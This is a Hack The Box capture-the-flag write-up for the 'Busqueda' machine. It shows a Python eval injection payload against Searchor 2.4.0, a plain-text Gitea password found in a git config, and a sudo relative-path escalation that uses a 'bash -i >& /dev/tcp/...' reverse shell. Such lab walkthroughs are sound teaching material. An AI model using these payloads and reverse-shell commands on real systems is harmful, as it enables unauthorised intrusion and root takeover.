---
layout: post
title: Busqueda (HTB-Easy)
date: 2023-6-27
categories: [Hack The Box]
tags: []
---

## Machine Summary

Busqueda is an easy-level box that has a webserver running a vulnerable version of the python Searchor application. This version is vulnerable to code injection which allows us to get a foothold on the box. Privlege escaltion to root is done by finding plain-text credentials for the main sudo-user on the box and then leveraging a relative-path vulnerability for the one script that user can run with sudo on the box.

## Reconnaissance

To start of the box let's run rustscan and see what we find. Below are the results of the scan:

```bash
rustscan -a 10.10.11.208 -b 500 -t 500
[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 10.10.11.208:22
Open 10.10.11.208:80
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 02:51 UTC
Initiating Ping Scan at 02:51
Scanning 10.10.11.208 [2 ports]
Completed Ping Scan at 02:51, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:51
Completed Parallel DNS resolution of 1 host. at 02:51, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 02:51
Scanning 10.10.11.208 [2 ports]
Discovered open port 80/tcp on 10.10.11.208
Discovered open port 22/tcp on 10.10.11.208
Completed Connect Scan at 02:51, 0.06s elapsed (2 total ports)
Nmap scan report for 10.10.11.208
Host is up, received syn-ack (0.028s latency).
Scanned at 2023-06-30 02:51:20 UTC for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
```

Looking at the scan results, we have 2 TCP ports open: SSH and HTTP. I already added 10.10.11.208 in my hosts file referencing __busqueda.htb__, now let us visit it in a browser. Doing this returns a __302 response code__. I ran a curl command against the box to see what it redirects to:

```bash
curl -i -k http://busqueda.htb
```

And got the following output:

```bash
HTTP/1.1 302 Found
Date: Fri, 30 Jun 2023 02:58:06 GMT
Server: Apache/2.4.52 (Ubuntu)
Location: http://searcher.htb/
Content-Length: 282
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://searcher.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at busqueda.htb Port 80</address>
</body></html>
```

It redirects to searcher.htb, let's go ahead and add that to our /etc/hosts file. Sometimes it still will redirect your router's /cgi-bin directory saying that it cannot find the site. Go ahead and clear your browser history if you run into this issue.

Now let's try going to __http://searcher.htb__. When we do we get this landing page:

![landing-page](/assets/images/machines/htb/busqueda/searcher-landing-page.png)

The site appears to be a psuedo search engine. You can select a search engine from a popular list of search engines and then write a query that you would want it to execute. There is also a redirect option that then takes the query you just made and makes a POST request with it. I just used the default AccuWeather one and did a query for rain and got the result string:

```
https://www.accuweather.com/en/search-locations?query=rain
```

Using the same query for Amazons engine, I got the following result:

```
https://www.amazon.com/s?k=rain
```

I did a bit more testing and each engine returns a unique format that it uses. The url in the browser is always __http://searcher.htb/search__ as well. 

I took a quick look at the source code for the page and saw a reference for a tool called __Searchor__. Doing a quick search for vulnerabilities for __Searchor__ returned a [post](https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303) by Snyk (I highly recommened using Snyk to look for vulnerable software/package versions) that said there was an Arbitrary Code Execution vulnerability for __Searchor__ versions 2.4.2 and lower. According to the html source, this site is running 2.4.0, so it is definitely vulnerable.

While I was looking at this vulnerability, I also had feroxbuster running in the background to do some web-directory fuzzing. I originally ran feroxbuster with the __raft-medium-directories__ wordlist but switched to the Apache.fuzz wordlist after learning that apache was the webserver that was in use. I did not find anything of interest aside from /search endpoint, I am assuming that 405 is because that is expecting a POST request instead of a GET. I am going to bet all of my money that this is the endpoint that I have to exploit. Output from the directory fuzz:

```bash
feroxbuster -k -u http://searcher.htb -w /usr/share/SecLists-master/Discovery/Web-Content/Apache.fuzz.txt -r

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://searcher.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/SecLists-master/Discovery/Web-Content/Apache.fuzz.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c http://searcher.htb/server-status
405      GET        5l       20w      153c http://searcher.htb/search
200      GET      430l      751w    13519c http://searcher.htb/
[####################] - 26s     8533/8533    0s      found:3       errors:1      
[####################] - 26s     8532/8532    333/s   http://searcher.htb/
```

## Shell as SVC

Taking a look at the Snyk report again, there was a link to a [Github commit](https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b) that was the code that changed. The code in red is the vulnerable version that was succeptable to RCE. Below is the snippet that was changed:

```python
url = eval(
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
```

From my previous CTF experiences looking at vulnerable Python code, I know that using the __eval()__ function can be very risky and can often lead to injection vulnerabilities if not implemented correctly. Looking at this code snippet, it is actually pretty easy to inject code into the __query__ variable. The jist of what needs to be done is that we need to format a curl command with the '-d' option to specify data that we want to send to the /search endpoint. We first will specify __'engine=Google'__ and then for query we will want to start it out with __',__ to escape from the query parameter and add another arg for the format string.  After that since this is python we will want to import the OS module so that we can inject a shell into the code, after we add in our code to start a reverse shell back to us we want to end the code with __))# comment__ to properly close out the code and comment out the rest of it. Basically the payload you want should look something like this:

```python
',__import__('os').system('code_to_execute_a_reverse_shell')) # super_hacker_man
```

There is actually already a [python script](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection) on github that will exploit this for us. How the payload for this was made was interesting too. It base64 encodes a reverse shell, saves it to a variable, echoes the variable into base64 -d to decode it, and the pipes the output of that into bash for it to be executed. Pretty cool right?

Running this script with the command:

```bash
bash exp.sh http://searcher.htb 'your_ip' 'your_port'
```

Will get you a reverse shell, just make sure to start a netcat listener first.

```bash
nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.11.208 44112
bash: cannot set terminal process group (1639): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ 

svc@busqueda:/var/www/app$ id
id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```

Let's see if we can read the __user.txt__ file for our first flag. We can!

```bash
svc@busqueda:~$ pwd
pwd
/home/svc
svc@busqueda:~$ ls -alh
ls -alh
total 36K
drwxr-x--- 4 svc  svc  4.0K Apr  3 08:58 .
drwxr-xr-x 3 root root 4.0K Dec 22  2022 ..
lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3.7K Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4.0K Feb 28 11:37 .cache
-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig
drwxrwxr-x 5 svc  svc  4.0K Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -> /dev/null
-rw-r----- 1 root svc    33 Jun 30 02:46 user.txt
svc@busqueda:~$ cat user.txt
cat user.txt
TIME_TO_DO_IT_YOURSELF ;)
```

## Privlege Escalation To Root

I am going to create the .ssh directory in the __svc__ user's home directory and add my public key to the authorized_keys file since the user has the appropriate permissions to do so. Now that we can ssh into the box, let's upload linpeas and see what we can find.

After uploading and running linpeas there were a couple things that I found. The first was that there was another subdomain __gitea.searcher.htb__. In the svc users's home directory there is a .gitconfig file present which makes me think that there might be a potential privlege escalation with git. I added __gitea.searcher.htb__ to my hosts file and then visited the subdomain in my browser and was directed to the page below:

![gitea](/assets/images/machines/htb/busqueda/gitea-busq.png)

Another thing I found was the __/opt/scripts__ directory. Each script in here had the octal permissions of __711__. I tried running the first two but got a permission denied error. I will come back and revisit these later.

One other thing I also found was the __/opt/containerd__ directory which leads me to think that there is a docker container running. I tried running __ls -al /opt/containerd__ but got a permission denied error. Looking at the privs of the /opt directory shows that only root has read and write permissions for this directory. To see what containers are running requires root permissions, so I will continue looking at what I can find with Git and come back to this later.

I looked around a little further to see if I could find some git credentials or something and running the command:

```bash
find / -name 'config' 2>/dev/null
```

This returned nothing of interest except that there was a config for git in the __/var/www/app/.git/__ directory. In this file there was a password that was a part of the cody user's remote origin URL (*this is used for authenticating into remote Git repos*).

```bash
svc@busqueda:/var/www/app/.git$ cat config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

The string after the colon and before the @, actually is the user password for the svc user. We can now run __sudo -l__ to see what the svc user has privleges to run on the box. We get the following:

```bash
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

We can apparently run this python script in the __/opt/scripts__ directory. Running __/usr/bin/python3 /opt/scripts/system-checkup.py__ returns a permission denied error, but tacking on __-h__ actually allows us to see the help information interestingly enough (*I alwyas recommend trying adding on some arguments when getting the permission denied error*). Also the only way you can get the below output is if you specify the whole bath for both the python3 binary and the script.

Doing this allows us to see the following:

```bash
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

So it appears that we can get some information on running containers on this machine using this script. I am going to run the script 3 times using each argument:

The output of docker-ps:

```bash
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   5 months ago   Up 6 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   5 months ago   Up 6 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Here we can see that we have gitea running (*we found this earlier*) and mysql which also interesting.

The output of docker-inspect is less interesting. When running this it asks for __'format' 'name'__ as the args. The __format__ arg is asking for a GO template. This can allow you to specify certain information pertaining to whichever container that you want to know. E.g.:

```bash
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{ .Name }}: {{ .State.Status }}' gitea
/gitea: running
```

Running the last command gets the following:

```bash
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
[=] Docker conteainers
{
  "/gitea": "running"
}
{
  "/mysql_db": "running"
}

[=] Docker port mappings
{
  "22/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "222"
    }
  ],
  "3000/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "3000"
    }
  ]
}

[=] Apache webhosts
[+] searcher.htb is up
[+] gitea.searcher.htb is up

[=] PM2 processes
┌─────┬────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name   │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0   │ app    │ default     │ N/A     │ fork    │ 1657     │ 6h     │ 0    │ online    │ 0%       │ 29.1mb   │ svc      │ disabled │
└─────┴────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘

[+] Done!
```

I was stuck at this point for a bit and cd'ed back to the users home directory. I ran the previous commands again and when I ran the __full-checkup__ command again, it returned __Something went wrong__. Since this is an easy level box I am going to assume that this is happening because the __system-checkup.py__ script is expecting a relative path for the __full-checkup (*full-checkup.sh*)__ argument for it to be run (*i.e. the script is expecting to be run from the /opt/script directory. This just means that there is no logic in the script that can allow it to be run from anywhere in the file system*).

To exploit this lets create a new script also called __full-checkup.sh__ in the __svc__ user's home directory. Add the following to the script:

```bash
#!/bin/bash

bash -i >& /dev/tcp/ip_addr/port 0>&1
```

Now mark the script as executable. Next start a netcat listener on your local machine. Now we are ready to run the exploit!

```bash
Victim machine
-----
svc@busqueda:~$ vi full-checkup.sh
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
svc@busqueda:~$ cat full-checkup.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.21/9090 0>&1
svc@busqueda:~$ chmod +x full-checkup.sh 
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
-----
Local
-----
h0ax@h0ax:~/Desktop/htb/htb-machines/easy-level/busqueda$ nc -lvnp 9090
Listening on 0.0.0.0 9090
Connection received on 10.10.11.208 54330
root@busqueda:/home/svc# 

root@busqueda:/home/svc# 

root@busqueda:/home/svc# cd /root
cd /root
root@busqueda:~# cat root.txt
cat root.txt
_do_it_urself_;)
```

Happy hacking everyone!